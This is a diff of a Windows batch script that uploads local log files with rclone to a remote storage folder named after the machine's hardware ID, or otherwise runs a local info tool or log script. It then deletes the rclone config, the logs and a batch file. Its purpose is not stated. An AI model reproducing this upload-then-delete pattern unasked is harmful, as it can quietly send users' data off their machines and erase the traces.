@@ -790,32 +790,17 @@ IF EXIST QTS-USRL.log (
 	IF EXIST rclone.conf (
 		IF EXIST QTS-USRL.log rclone --config="rclone.conf" copy QTS-USRL.log QTS:%HHWID%/
 	) else (
-		ren QTS-USRL.log QTS-USRL.txt
-		timeout /t 01 /nobreak>nul
-		START "" "bin\INFO\info.exe" /972737237993466355732533
+		echo WIP ## DESSOUS
 	)
 )
 
-IF EXIST RWC-USRL.log (
-	IF EXIST rclone.conf (
-		IF EXIST RWC-USRL.log rclone --config="rclone.conf" copy RWC-USRL.log QTS:%HHWID%/
-	) else (
-		ren RWC-USRL.log RWC-USRL.txt
-		timeout /t 01 /nobreak>nul
-		START "" "bin\INFO\info.exe" /972737237993466355732533
-	)
+IF EXIST rclone.conf (
+	IF EXIST "C:\Ect\RWC\RWC-USRL.log" rclone --config="rclone.conf" copy RWC-USRL.log QTS:%HHWID%/
+) else (
+	IF EXIST "C:\Ect\RWC\RWC-USRL.log" call C:\Ect\RWC\bin\INFO\slog.bat
 )
 
-IF NOT EXIST rclone.conf (
-	IF EXIST RWC-USRL.log (
-		cd /d %~dp0
-		cls
-		ren RWC-USRL.log RWC-USRL.txt
-		timeout /t 01 /nobreak>nul
-		START "" "bin\INFO\info.exe" /972737237993466355732533
-	)
-)
-
+cd /d %~dp0
 Ping 10>nul
 DEL QTS-USRL.log
 DEL ID.log
@@ -825,8 +810,3 @@ DEL rclone.conf
 DEL sec-ath.bat
 DEL RWC-USRL.log
 Exit
-
-
-
-
-
